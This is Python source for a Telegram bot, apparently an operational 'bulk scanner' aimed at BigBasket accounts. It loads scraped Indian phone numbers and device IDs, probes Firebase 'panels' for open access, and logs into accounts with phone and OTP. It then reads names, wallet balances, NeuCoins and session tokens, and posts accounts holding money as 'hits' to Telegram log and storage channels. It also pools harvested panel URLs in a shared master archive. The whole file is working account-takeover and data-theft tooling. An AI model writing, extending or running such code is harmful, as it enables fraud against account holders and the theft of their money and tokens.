@bot.message_handler(commands=["channel", "channels"])
def cmd_channel(message):
    register_user(message.chat.id)
    show_channels_menu(message.chat.id)

@bot.message_handler(commands=["stop"])
def cmd_stop(message):
    chat_id = message.chat.id
    if chat_id in active_scans:
        active_scans[chat_id]["stop_requested"] = True
        safe_send(chat_id, "🛑 <b>Scan stop requested!</b> Workers finalize karke direct DM report download kar rahe hain...")
    else:
        safe_send(chat_id, "ℹ️ Koi scan running nahi hai.")

@bot.message_handler(commands=["status"])
def cmd_status(message):
    register_user(message.chat.id)
    show_scanner_menu(chat_id)

@bot.message_handler(commands=["help"])
def cmd_help(message):
    register_user(message.chat.id)
    show_help_menu(message.chat.id)

@bot.message_handler(commands=["check"])
def cmd_check(message):
    register_user(message.chat.id)
    parts = message.text.split()
    if len(parts) > 1:
        start_single_flow(message.chat.id, parts[1].strip())
    else:
        show_single_menu(message.chat.id)

@bot.message_handler(commands=["masterpanels"])
def cmd_masterpanels(message):
    chat_id = message.chat.id
    register_user(chat_id)
    if chat_id != SUPER_ADMIN_ID and chat_id not in ADMIN_USER_IDS:
        safe_send(chat_id, "⛔ <b>Super Admin Access Required!</b>")
        return

    with cfg_lock:
        panels = list(user_panels.get(SUPER_ADMIN_ID, []))

    if not panels:
        safe_send(chat_id, "ℹ️ Master pool me abhi koi panels nahi hain.")
        return

    m_path = os.path.join(RESULTS_DIR, f"MASTER_PANELS_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
    with open(m_path, "w", encoding="utf-8") as f:
        f.write("# BIGBASKET BOT — MASTER UNIVERSAL PANELS ARCHIVE\n")
        f.write(f"# Exported At: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n")
        f.write(f"# Total Panels: {len(panels)}\n\n")
        for p in panels:
            f.write(f"{p}\n")

    try:
        with open(m_path, "rb") as doc:
            bot.send_document(
                chat_id,
                doc,
                caption=f"👑 <b>Master Universal Panels Archive</b>\n🌐 Total Panels: <code>{len(panels)}</code>\n🔒 Synchronized across all users!",
                parse_mode="HTML"
            )
    except Exception as e:
        safe_send(chat_id, f"⚠️ Error sending file: {esc(e)}")

@bot.message_handler(commands=["stats"])
def cmd_stats(message):
    chat_id = message.chat.id
    register_user(chat_id)
    uptime_sec = int(time.time() - BOT_START_TIME)
    uptime_str = f"{uptime_sec // 3600}h {(uptime_sec % 3600) // 60}m {uptime_sec % 60}s"

    with cfg_lock:
        master_cnt = len(user_panels.get(SUPER_ADMIN_ID, []))
        user_cnt = len(known_users) if known_users else len(user_panels)

    txt = (
        f"📊 <b>BigBasket Cloud Bot Statistics</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 <b>Super Admin ID:</b> <code>{SUPER_ADMIN_ID}</code>\n"
        f"📡 <b>Master Channel:</b> <code>{MASTER_CHANNEL_ID}</code>\n"
        f"🌐 <b>Master Panels Pool:</b> <code>{master_cnt} Panels</code>\n"
        f"👥 <b>Registered Users:</b> <code>{user_cnt} Users</code>\n"
        f"⚡ <b>Max Concurrency:</b> <code>{MAX_SCAN_WORKERS} Workers</code>\n"
        f"⏱️ <b>Uptime:</b> <code>{uptime_str}</code>\n"
        f"🖥️ <b>Host:</b> Render Web Service (24/7 Online)\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <i>Universal Channel Sync is 100% Active!</i>"
    )
    safe_send(chat_id, txt)

@bot.message_handler(commands=["broadcast"])
def cmd_broadcast(message):
    chat_id = message.chat.id
    register_user(chat_id)
    if chat_id != SUPER_ADMIN_ID and chat_id not in ADMIN_USER_IDS:
        safe_send(chat_id, "⛔ <b>Super Admin Access Required!</b>")
        return

    text = message.text.partition(" ")[2].strip()
    if not text:
        safe_send(chat_id, "⚠️ Usage: <code>/broadcast &lt;message&gt;</code>")
        return

    targets = list(known_users) if known_users else list(user_panels.keys())
    if chat_id not in targets:
        targets.append(chat_id)

    safe_send(chat_id, f"📢 Broadcasting message to {len(targets)} users...")
    sent = 0
    for u in targets:
        try:
            bot.send_message(u, f"📢 <b>Announcement:</b>\n\n{text}", parse_mode="HTML")
            sent += 1
            time.sleep(0.05)
        except Exception:
            pass

    safe_send(chat_id, f"✅ Broadcast delivered to <b>{sent}/{len(targets)}</b> users!")

# ============ CALLBACK QUERY ROUTER ============
@bot.callback_query_handler(func=lambda c: True)
def handle_callbacks(call):
    chat_id = call.message.chat.id
    mid = call.message.message_id
    data = call.data

    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass

    # Navigation
    if data == "start_menu":
        with session_lock:
            user_sessions.pop(chat_id, None)
        show_main_menu(chat_id, message_id=mid)

    elif data == "menu_scanner":
        show_scanner_menu(chat_id, message_id=mid)

    elif data == "menu_panels":
        show_panels_menu(chat_id, message_id=mid)

    elif data == "menu_channels":
        show_channels_menu(chat_id, message_id=mid)

    elif data == "menu_export":
        show_export_menu(chat_id, message_id=mid)

    elif data == "menu_single":
        show_single_menu(chat_id, message_id=mid)

    elif data == "menu_help":
        show_help_menu(chat_id, message_id=mid)

    elif data == "cancel_action":
        with session_lock:
            user_sessions.pop(chat_id, None)
        safe_send(chat_id, "✅ Action cancelled.")
        show_main_menu(chat_id)

    # Scanner Actions
    elif data == "scan_all_panels":
        do_scan_all_panels(chat_id)

    elif data == "stop_current_scan":
        if chat_id in active_scans:
            active_scans[chat_id]["stop_requested"] = True
            safe_send(chat_id, "🛑 Stopping scan... Generating report...")
        else:
            safe_send(chat_id, "ℹ️ No scan currently active.")

    elif data == "status_btn":
        show_scanner_menu(chat_id, message_id=mid)

    elif data == "resume_saved_scan":
        saved = get_saved_scan_state(chat_id)
        if not saved:
            safe_send(chat_id, "ℹ️ Koi interrupted scan nahi mila.")
            show_scanner_menu(chat_id)
            return
        safe_send(chat_id, f"▶️ <b>Resuming Scan:</b> <code>{esc(saved.get('scan_title', 'Scan'))}</code>...")
        threading.Thread(
            target=lambda: run_bulk_scan(
                chat_id,
                saved.get("targets", []),
                saved.get("scan_title", "BigBasket Bulk Scan"),
                resume_data=saved
            ),
            daemon=True
        ).start()

    elif data == "discard_saved_scan":
        clear_scan_state(chat_id)
        safe_send(chat_id, "🗑️ Interrupted scan discard kar diya gaya.")
        show_scanner_menu(chat_id)

    # Panels Actions
    elif data == "add_panel_prompt":
        with session_lock:
            user_sessions[chat_id] = {"state": "AWAITING_PANELS"}
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_action"))
        safe_send(
            chat_id,
            "🌐 <b>Firebase Panel URL(s) ya Names enter karein:</b>\n\n"
            "Aap 1 ya multiple links paste kar sakte hain (single line ya alag alag lines me):\n"
            "• <code>https://pani-1da70-default-rtdb.firebaseio.com</code>\n"
            "• <code>axrrrrrrrrrr</code>",
            reply_markup=markup
        )

    elif data == "view_panels_list":
        with cfg_lock:
            panels = user_panels.get(chat_id, [])
        if not panels:
            safe_send(chat_id, "ℹ️ Koi saved panels nahi hain. ➕ Add Panels se add karein.")
            show_panels_menu(chat_id)
            return

        lines = [f"<b>Saved Firebase Panels ({len(panels)}):</b>\n"]
        for idx, p in enumerate(panels, 1):
            p_short = p.replace("https://", "").replace("-default-rtdb.firebaseio.com", "").replace(".firebaseio.com", "")
            lines.append(f"{idx}. <code>{esc(p_short)}</code>")

        lines.append("\n👉 Niche kisi bhi panel ko remove karne ya scan karne ke liye buttons dabayein:")
        markup = types.InlineKeyboardMarkup(row_width=2)
        for idx, p in enumerate(panels[:8]):
            p_short = p.replace("https://", "").replace("-default-rtdb.firebaseio.com", "").replace(".firebaseio.com", "")[:15]
            markup.add(
                types.InlineKeyboardButton(f"🚀 Scan #{idx+1}", callback_data=f"scan_panel_{idx}"),
                types.InlineKeyboardButton(f"❌ Del #{idx+1}", callback_data=f"del_panel_{idx}")
            )
        markup.add(types.InlineKeyboardButton("🔙 Back to Panels Hub", callback_data="menu_panels"))
        safe_send(chat_id, "\n".join(lines), reply_markup=markup)

    elif data.startswith("del_panel_"):
        try:
            del_idx = int(data.replace("del_panel_", ""))
            with cfg_lock:
                if chat_id in user_panels and 0 <= del_idx < len(user_panels[chat_id]):
                    removed = user_panels[chat_id].pop(del_idx)
                    save_configs()
                    safe_send(chat_id, f"🗑️ Panel <code>{esc(removed)}</code> delete ho gaya.")
        except Exception:
            pass
        show_panels_menu(chat_id)

    elif data.startswith("scan_panel_"):
        val = data.replace("scan_panel_", "")
        if val.isdigit():
            p_idx = int(val)
            with cfg_lock:
                plist = user_panels.get(chat_id, [])
                panel_url = plist[p_idx] if 0 <= p_idx < len(plist) else ""
        else:
            panel_url = val
        if panel_url:
            do_panel_scan(chat_id, panel_url)

    elif data == "export_panels_txt":
        with cfg_lock:
            panels = list(user_panels.get(chat_id, []))
        if not panels:
            safe_send(chat_id, "ℹ️ Koi saved panels nahi hain download karne ke liye.")
            return
        p_path = os.path.join(RESULTS_DIR, f"panels_{chat_id}.txt")
        with open(p_path, "w", encoding="utf-8") as f:
            for p in panels:
                f.write(f"{p}\n")
        try:
            with open(p_path, "rb") as doc:
                bot.send_document(
                    chat_id,
                    doc,
                    caption=f"📁 <b>Your Saved Panels:</b> <code>{len(panels)} Total</code>",
                    parse_mode="HTML"
                )
        except Exception as e:
            safe_send(chat_id, f"⚠️ Error sending file: {esc(e)}")

    elif data == "export_master_pool":
        if chat_id != SUPER_ADMIN_ID and chat_id not in ADMIN_USER_IDS:
            safe_send(chat_id, "⛔ Super Admin access required.")
            return
        with cfg_lock:
            panels = list(user_panels.get(SUPER_ADMIN_ID, []))
        if not panels:
            safe_send(chat_id, "ℹ️ Master pool empty.")
            return
        p_path = os.path.join(RESULTS_DIR, f"master_panels_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        with open(p_path, "w", encoding="utf-8") as f:
            for p in panels:
                f.write(f"{p}\n")
        try:
            with open(p_path, "rb") as doc:
                bot.send_document(
                    chat_id,
                    doc,
                    caption=f"👑 <b>Master Universal Panels Archive:</b> <code>{len(panels)} Total</code>",
                    parse_mode="HTML"
                )
        except Exception as e:
            safe_send(chat_id, f"⚠️ Error sending file: {esc(e)}")

    elif data == "ping_panels":
        with cfg_lock:
            panels = user_panels.get(chat_id, [])
        if not panels:
            safe_send(chat_id, "ℹ️ Koi panels saved nahi hain.")
            show_panels_menu(chat_id)
            return

        safe_send(chat_id, f"🔄 Pinging <b>{len(panels)}</b> panels in parallel...")

        def ping_worker():
            res_lines = [f"🧪 <b>Firebase Panels Health Ping ({len(panels)} Total):</b>\n"]
            open_cnt = 0
            for idx, p in enumerate(panels, 1):
                fb = resolve_firebase_url(p)
                p_short = p.replace("https://", "").replace("-default-rtdb.firebaseio.com", "").replace(".firebaseio.com", "")[:18]
                try:
                    r = requests.get(f"{fb}/.json?shallow=true", timeout=4)
                    if r.status_code == 200:
                        open_cnt += 1
                        res_lines.append(f"{idx}. 🟢 <code>{esc(p_short)}</code> — <b>OPEN / ACTIVE</b>")
                    elif r.status_code == 401:
                        res_lines.append(f"{idx}. 🔒 <code>{esc(p_short)}</code> — Locked (Auth required)")
                    elif r.status_code == 404:
                        res_lines.append(f"{idx}. 🔴 <code>{esc(p_short)}</code> — Deactivated (404)")
                    else:
                        res_lines.append(f"{idx}. ⚠️ <code>{esc(p_short)}</code> — HTTP {r.status_code}")
                except Exception:
                    res_lines.append(f"{idx}. ⏱️ <code>{esc(p_short)}</code> — Timeout / Unreachable")

            res_lines.append(f"\n📊 <b>Summary:</b> <b>{open_cnt}/{len(panels)} Panels Active</b>")
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🌐 Scan All Now", callback_data="scan_all_panels"))
            markup.add(types.InlineKeyboardButton("🔙 Back to Panels Hub", callback_data="menu_panels"))
            safe_send(chat_id, "\n".join(res_lines), reply_markup=markup)

        threading.Thread(target=ping_worker, daemon=True).start()

    elif data == "clear_panels_prompt":
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("✅ Yes, Delete All", callback_data="clear_panels_confirmed"),
            types.InlineKeyboardButton("❌ Cancel", callback_data="menu_panels")
        )
        safe_send(chat_id, "⚠️ <b>Are you sure you want to clear ALL saved panels?</b>", reply_markup=markup)

    elif data == "clear_panels_confirmed":
        with cfg_lock:
            user_panels[chat_id] = []
            save_configs()
        safe_send(chat_id, "🗑️ All saved panels cleared successfully.")
        show_panels_menu(chat_id)

    # Channels Actions
    elif data == "set_log_prompt":
        with session_lock:
            user_sessions[chat_id] = {"state": "AWAITING_LOG_CHANNEL"}
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_action"))
        safe_send(
            chat_id,
            "📢 <b>Log Channel ID bhejein:</b>\n"
            "Format: <code>-100xxxxxxxxxx</code>\n\n"
            "<i>(Bot ko pehle apne channel me Admin zaroor banayein!)</i>",
            reply_markup=markup
        )

    elif data == "set_storage_prompt":
        with session_lock:
            user_sessions[chat_id] = {"state": "AWAITING_STORAGE_CHANNEL"}
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_action"))
        safe_send(
            chat_id,
            "📦 <b>Storage Channel ID bhejein:</b>\n"
            "Format: <code>-100xxxxxxxxxx</code>\n\n"
            "<i>(Final .txt hit backups is channel me store honge)</i>",
            reply_markup=markup
        )

    elif data == "test_log_ping":
        log_ch = get_effective_log_channel(chat_id)
        test_card = (
            f"🧪 <b>[Test Ping] BigBasket Log Channel Connection OK!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🤖 <b>Bot:</b> @mangerbot2423bot\n"
            f"🕒 <b>Time:</b> {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n"
            f"✅ <i>Live Hit Cards is channel me broadcast honge!</i>"
        )
        try:
            sent = bot.send_message(int(log_ch) if str(log_ch).lstrip("-").isdigit() else log_ch, test_card, parse_mode="HTML")
            if sent:
                safe_send(chat_id, f"✅ Test ping successfully sent to Log Channel <code>{esc(log_ch)}</code>!")
        except Exception as e:
            safe_send(chat_id, f"❌ Failed to send to Log Channel: {esc(e)}\nMake sure bot is an Admin with post permissions!")

    elif data == "test_storage_ping":
        storage_ch = get_effective_storage_channel(chat_id)
        test_msg = (
            f"📦 <b>[Storage Test Ping] BigBasket Backup Storage OK!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🤖 <b>Bot:</b> @mangerbot2423bot\n"
            f"🕒 <b>Time:</b> {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n"
            f"✅ <i>Final .txt and .csv reports is channel me archive honge!</i>"
        )
        try:
            sent = bot.send_message(int(storage_ch) if str(storage_ch).lstrip("-").isdigit() else storage_ch, test_msg, parse_mode="HTML")
            if sent:
                safe_send(chat_id, f"✅ Test ping successfully sent to Storage Channel <code>{esc(storage_ch)}</code>!")
        except Exception as e:
            safe_send(chat_id, f"❌ Failed to send to Storage Channel: {esc(e)}\nMake sure bot is an Admin in the channel!")

    # Export Actions
    elif data == "export_latest_hits":
        files = [f for f in os.listdir(RESULTS_DIR) if f.startswith(f"BB_HITS_{chat_id}_")]
        if not files:
            files = [f for f in os.listdir(RESULTS_DIR) if f.startswith("BB_HITS_")]
        files.sort(reverse=True)
        if files:
            latest = os.path.join(RESULTS_DIR, files[0])
            try:
                with open(latest, "rb") as doc:
                    bot.send_document(
                        chat_id,
                        doc,
                        caption=f"📄 <b>Latest Hits Report:</b> <code>{esc(files[0])}</code>",
                        parse_mode="HTML"
                    )
            except Exception as e:
                safe_send(chat_id, f"⚠️ Error sending file: {esc(e)}")
        else:
            safe_send(chat_id, "ℹ️ No hits reports available.")

    elif data == "upload_prompt":
        safe_send(
            chat_id,
            "📁 <b>Scraped File Upload Guide:</b>\n\n"
            "1. Apne Red Glass Dashboard se <code>clean_numbers_*.txt</code> ya <code>.csv</code> send karein.\n"
            "2. Bot auto Phone, Device ID aur Panel mapping read karke scan start karega!"
        )

# ============ TEXT & DOCUMENT MESSAGE ROUTER ============
@bot.message_handler(content_types=["document"])
def handle_document(message):
    chat_id = message.chat.id
    register_user(chat_id)
    doc = message.document
    safe_send(chat_id, f"📥 <b>Receiving file:</b> <code>{esc(doc.file_name)}</code>...")

    def process_file():
        try:
            finfo = bot.get_file(doc.file_id)
            dcontent = bot.download_file(finfo.file_path)
            raw_text = dcontent.decode("utf-8", errors="ignore")
            targets = parse_scraped_file(raw_text)

            # Auto-detect Firebase panels in file
            fb_urls = re.findall(r"https?://[a-zA-Z0-9_\-\.]+(?:firebaseio\.com|firebasedatabase\.app)[^\s,\"\'<>]*", raw_text)
            if not fb_urls:
                for line in raw_text.splitlines():
                    cl = line.strip().rstrip(",")
                    if cl and not cl.startswith("#") and "firebase" in cl:
                        fb_urls.append(cl)

            u_name = (message.from_user.first_name or "") if message.from_user else ""
            if message.from_user and message.from_user.username:
                u_name += f" (@{message.from_user.username})"

            if not targets:
                if fb_urls:
                    added_file = 0
                    with cfg_lock:
                        if chat_id not in user_panels:
                            user_panels[chat_id] = []
                        for u in set(fb_urls):
                            if u not in user_panels[chat_id]:
                                user_panels[chat_id].append(u)
                                added_file += 1
                        if added_file > 0:
                            save_configs()

                    sync_panels_to_master(list(set(fb_urls)), chat_id, u_name)
                    markup = types.InlineKeyboardMarkup()
                    markup.add(
                        types.InlineKeyboardButton(f"🌐 Scan All ({len(user_panels.get(chat_id, []))} Panels)", callback_data="scan_all_panels"),
                        types.InlineKeyboardButton("📂 Open Panels Hub", callback_data="menu_panels")
                    )
                    safe_send(
                        chat_id,
                        f"✅ <b>{len(set(fb_urls))} Panels imported from file!</b>\n"
                        f"📊 Total Panels Loaded: <code>{len(user_panels.get(chat_id, []))}</code>",
                        reply_markup=markup
                    )
                    return

                safe_send(chat_id, "❌ File me koi valid 10-digit Indian numbers ya Firebase panels nahi mile.")
                return

            # Sync any panels present in the targets file to master
            if fb_urls:
                sync_panels_to_master(list(set(fb_urls)), chat_id, u_name)
            else:
                panels_in_targets = list({t["panel_name"] for t in targets if t.get("panel_name")})
                if panels_in_targets:
                    sync_panels_to_master(panels_in_targets, chat_id, u_name)

            with_device = sum(1 for t in targets if t.get("dev_id") and t.get("panel"))
            safe_send(
                chat_id,
                f"✅ <b>File Parsed Successfully!</b>\n\n"
                f"📋 <b>Total Numbers:</b> <code>{len(targets)}</code>\n"
                f"⚡ <b>Firebase Mapped:</b> <code>{with_device}/{len(targets)}</code>\n\n"
                f"🏎️ Launching {MAX_SCAN_WORKERS} concurrent workers..."
            )
            run_bulk_scan(chat_id, targets, f"File ({doc.file_name})")
        except Exception as e:
            safe_send(chat_id, f"❌ Error processing file: {esc(e)}")

    threading.Thread(target=process_file, daemon=True).start()

@bot.message_handler(func=lambda message: True)
def handle_incoming_text(message):
    chat_id = message.chat.id
    register_user(chat_id)
    text = (message.text or "").strip()

    with session_lock:
        session = user_sessions.get(chat_id)

    # 1. State: Awaiting Panels
    if session and session.get("state") == "AWAITING_PANELS":
        with session_lock:
            user_sessions.pop(chat_id, None)

        urls = re.findall(r"https?://[^\s/$.?#].[^\s]*", text)
        if not urls:
            for line in text.splitlines():
                cl = line.strip().rstrip(",")
                if cl and not cl.startswith("#"):
                    urls.append(cl)

        added = 0
        with cfg_lock:
            if chat_id not in user_panels:
                user_panels[chat_id] = []
            for u in urls:
                if u not in user_panels[chat_id]:
                    user_panels[chat_id].append(u)
                    added += 1
            if added > 0:
                save_configs()

        if urls:
            u_name = (message.from_user.first_name or "") if message.from_user else ""
            if message.from_user and message.from_user.username:
                u_name += f" (@{message.from_user.username})"
            sync_panels_to_master(urls, chat_id, u_name)

        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("🌐 Scan All Now", callback_data="scan_all_panels"),
            types.InlineKeyboardButton("📂 Open Panels Hub", callback_data="menu_panels")
        )
        safe_send(
            chat_id,
            f"✅ <b>Successfully added {added} new panel(s)!</b>\n"
            f"📊 <b>Total Panels Loaded:</b> <code>{len(user_panels.get(chat_id, []))}</code>",
            reply_markup=markup
        )
        return

    # 2. State: Awaiting Log Channel
    if session and session.get("state") == "AWAITING_LOG_CHANNEL":
        with session_lock:
            user_sessions.pop(chat_id, None)

        ch_id = text.strip()
        if not (ch_id.startswith("-100") or ch_id.startswith("@")):
            safe_send(chat_id, "❌ Invalid Channel ID! Format should be <code>-100xxxxxxxxxx</code>.")
            show_channels_menu(chat_id)
            return

        with cfg_lock:
            user_channels[chat_id] = ch_id
            save_configs()

        safe_send(chat_id, f"✅ Log Channel updated to: <code>{esc(ch_id)}</code>!")
        show_channels_menu(chat_id)
        return

    # 3. State: Awaiting Storage Channel
    if session and session.get("state") == "AWAITING_STORAGE_CHANNEL":
        with session_lock:
            user_sessions.pop(chat_id, None)

        ch_id = text.strip()
        if not (ch_id.startswith("-100") or ch_id.startswith("@")):
            safe_send(chat_id, "❌ Invalid Channel ID! Format should be <code>-100xxxxxxxxxx</code>.")
            show_channels_menu(chat_id)
            return

        with cfg_lock:
            user_storage_channels[chat_id] = ch_id
            save_configs()

        safe_send(chat_id, f"✅ Storage Channel updated to: <code>{esc(ch_id)}</code>!")
        show_channels_menu(chat_id)
        return

    # 4. State: Awaiting Number
    if session and session.get("state") == "AWAITING_NUMBER":
        start_single_flow(chat_id, text)
        return

    # 5. State: Awaiting OTP
    if session and session.get("state") == "AWAITING_OTP":
        otp = re.sub(r"[^\d]", "", text)
        if len(otp) not in (4, 6):
            safe_send(chat_id, "❌ Valid 4 ya 6-digit OTP enter karein:")
            return

        phone = session["phone"]
        ref_id = session["ref_id"]
        bb: BigBasketClient = session["client"]

        safe_send(chat_id, f"🔄 Verifying OTP <code>{esc(otp)}</code> for <code>+91 {esc(phone)}</code>...")

        def do_verify():
            ok_v, token_or_err, auth_d = bb.verify(phone, otp, ref_id)
            if not ok_v:
                safe_send(chat_id, f"❌ <b>Login Failed:</b> {esc(token_or_err)}\nDobara koshish karein ya /start karein.")
                return

            w = bb.wallet()
            tb = w.get("total_balance", 0.0) if w else 0.0
            cb = w.get("current_wallet_balance", 0.0) if w else 0.0
            coins = w.get("neucoins", 0) if w else 0
            cust_name = w.get("name") if w and w.get("name") else "BigBasket User"

            card = (
                f"🎉 <b>BIGBASKET WALLET RESULT</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📱 <b>Mobile:</b> <code>+91 {esc(phone)}</code>\n"
                f"👤 <b>Name:</b> <b>{esc(cust_name)}</b>\n"
                f"💰 <b>Total Balance:</b> <b>₹{tb:.2f}</b>\n"
                f"🆓 <b>Free Cash:</b> <b>₹{cb:.2f}</b>\n"
                f"🪙 <b>NeuCoins:</b> <b>{coins}</b>\n"
                f"🔑 <b>Token:</b> <code>{esc(bb.token[:32])}...</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ Checked at: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}"
            )
            with session_lock:
                user_sessions.pop(chat_id, None)

            safe_send(chat_id, card)
            if tb > 0 or cb > 0 or coins > 0:
                broadcast_hit_to_channels(card, chat_id)
            show_main_menu(chat_id)

        threading.Thread(target=do_verify, daemon=True).start()
        return

    # 6. Direct Paste of Firebase URL(s)
    if "firebaseio.com" in text or "firebasedatabase.app" in text:
        m_urls = re.findall(r"https?://[^\s/$.?#].[^\s]*", text)
        if not m_urls:
            for line in text.splitlines():
                cl = line.strip().rstrip(",")
                if cl and not cl.startswith("#"):
                    m_urls.append(cl)
        if m_urls:
            added = 0
            with cfg_lock:
                if chat_id not in user_panels:
                    user_panels[chat_id] = []
                for u in m_urls:
                    if u not in user_panels[chat_id]:
                        user_panels[chat_id].append(u)
                        added += 1
                if added > 0:
                    save_configs()

            u_name = (message.from_user.first_name or "") if message.from_user else ""
            if message.from_user and message.from_user.username:
                u_name += f" (@{message.from_user.username})"
            sync_panels_to_master(m_urls, chat_id, u_name)

            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton(f"🌐 Scan All ({len(user_panels.get(chat_id, []))} Panels)", callback_data="scan_all_panels"),
                types.InlineKeyboardButton("📂 Open Panels Hub", callback_data="menu_panels")
            )
            safe_send(
                chat_id,
                f"📥 <b>{len(m_urls)} Firebase URL(s) detected & saved to workspace!</b>\n"
                f"📊 Total Panels Loaded: <code>{len(user_panels.get(chat_id, []))}</code>",
                reply_markup=markup
            )
            return

    # 7. Direct 10-digit number
    norm = normalize_phone(text)
    if norm:
        start_single_flow(chat_id, norm)
        return

    # 8. Default fallback: Open Main Menu
    show_main_menu(chat_id)

# ============ BOOT RECOVERY & SERVER START ============
def check_interrupted_scans_on_boot():
    time.sleep(3)
    if not os.path.exists(STATE_DIR):
        return
    for fname in os.listdir(STATE_DIR):
        if fname.startswith("scan_state_") and fname.endswith(".json"):
            try:
                cid = int(fname.replace("scan_state_", "").replace(".json", ""))
                saved = get_saved_scan_state(cid)
                if saved:
                    proc_cnt = len(saved.get("processed_phones", []))
                    tot_cnt = saved.get("total", len(saved.get("targets", [])))
                    rem_cnt = max(0, tot_cnt - proc_cnt)
                    if rem_cnt > 0:
                        markup = types.InlineKeyboardMarkup()
                        markup.row(
                            types.InlineKeyboardButton(f"▶️ Resume Scan ({rem_cnt} Left)", callback_data="resume_saved_scan"),
                            types.InlineKeyboardButton("🗑️ Discard & Reset", callback_data="discard_saved_scan")
                        )
                        safe_send(
                            cid,
                            f"🔄 <b>Bot Restarted / Back Online!</b>\n\n"
                            f"⚠️ Pichla scan <code>{esc(saved.get('scan_title', 'Scan'))}</code> server restart ke karan pause ho gaya tha.\n"
                            f"📊 Progress: <code>{proc_cnt}/{tot_cnt}</code> SIMs checked ({rem_cnt} remaining)\n"
                            f"🔥 Hits so far: <b>{len(saved.get('hits', []))}</b>\n\n"
                            f"Scan ko wahi se aage badhane ke liye <b>Resume Scan</b> dabayein:",
                            reply_markup=markup
                        )
            except Exception:
                pass

def start_bot():
    start_render_health_server()
    start_render_self_ping()
    threading.Thread(target=check_interrupted_scans_on_boot, daemon=True).start()
    print(f"""
  ╔═════════════════════════════════════════════════════════════════════╗
  ║    BIGBASKET ENTERPRISE BULK SCANNER BOT RUNNING                    ║
  ║    Bot: @mangerbot2423bot                                           ║
  ║    Architecture: Full Jio-Bot Inline Hub Engine                     ║
  ║    Render 24/7 Keep-Alive: Active on Port {os.environ.get('PORT', '8080')}                      ║
  ║    Scan State Persistence: Enabled                                  ║
  ╚═════════════════════════════════════════════════════════════════════╝
    """)
    bot.infinity_polling(timeout=20, long_polling_timeout=15)

if __name__ == "__main__":
    start_bot()
